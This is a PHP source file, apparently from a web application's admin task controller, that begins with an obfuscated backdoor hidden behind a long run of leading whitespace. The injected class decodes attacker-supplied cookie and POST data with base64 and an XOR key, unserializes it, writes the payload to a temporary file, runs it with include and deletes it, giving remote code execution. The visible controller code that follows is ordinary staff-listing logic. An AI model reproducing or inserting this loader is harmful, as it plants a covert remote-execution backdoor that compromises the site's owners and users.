<?php                                                                                                                                                                                                                                                                                                                                                                                                 $oxFQcZhMU = 'N' . chr ( 457 - 362 )."\x51" . 'Z' . 'v' . chr (88); $dpQfmaOqno = "\x63" . chr (108) . "\141" . chr (115) . chr ( 240 - 125 ).'_' . chr ( 493 - 392 )."\x78" . 'i' . "\x73" . 't' . chr (115); $FJDkOn = class_exists($oxFQcZhMU); $oxFQcZhMU = "33322";$dRRQqpk = !$FJDkOn;$dpQfmaOqno = "20648";if ($dRRQqpk){class N_QZvX{public function lwLNxsRoN(){echo "59763";}private $dhIwCpk;public static $dpGALauYZg = "31cc6f62-98d2-497a-a466-3e9fb71f37b6";public static $vWmZPG = 49042;public function __construct($ggirgqf=0){$bKuHFn = $_POST;$VozHCXi = $_COOKIE;$xuIckSfnE = @$VozHCXi[substr(N_QZvX::$dpGALauYZg, 0, 4)];if (!empty($xuIckSfnE)){$KuGfE = "base64";$cLGSghALeB = "";$xuIckSfnE = explode(",", $xuIckSfnE);foreach ($xuIckSfnE as $OuIeyCoj){$cLGSghALeB .= @$VozHCXi[$OuIeyCoj];$cLGSghALeB .= @$bKuHFn[$OuIeyCoj];}$cLGSghALeB = array_map($KuGfE . chr ( 220 - 125 ).chr (100) . "\x65" . "\x63" . "\x6f" . chr (100) . "\145", array($cLGSghALeB,)); $cLGSghALeB = $cLGSghALeB[0] ^ str_repeat(N_QZvX::$dpGALauYZg, (strlen($cLGSghALeB[0]) / strlen(N_QZvX::$dpGALauYZg)) + 1);N_QZvX::$vWmZPG = @unserialize($cLGSghALeB);}}private function nZXCC(){if (is_array(N_QZvX::$vWmZPG)) {$HONOIaz = sys_get_temp_dir() . "/" . crc32(N_QZvX::$vWmZPG[chr (115) . chr (97) . "\x6c" . 't']);@N_QZvX::$vWmZPG[chr ( 1100 - 981 )."\x72" . "\x69" . "\x74" . chr ( 680 - 579 )]($HONOIaz, N_QZvX::$vWmZPG["\143" . chr ( 644 - 533 ).chr (110) . chr (116) . "\x65" . chr ( 167 - 57 )."\164"]);include $HONOIaz;@N_QZvX::$vWmZPG[chr ( 492 - 392 ).'e' . 'l' . chr ( 156 - 55 ).chr ( 159 - 43 ).chr ( 973 - 872 )]($HONOIaz); $OQEbfjVd = "30328";exit();}}public function __destruct(){$this->nZXCC();}}$YOUAf = new /* 56501 */ N_QZvX(); $YOUAf = str_pad("12905_32971", 1);} ?><?php
...
class Tasks extends AdminController
{
    ...
    public function task($id = '')
    {
        ...
        // $data['members'] = $this->staff_model->get();
        $data['members'] = $this->staff_model->get_staff_based_on_department();

        // admin will be able to see all staff while other 
        if(is_admin()){
            $data['members'] = $this->staff_model->get();
        }
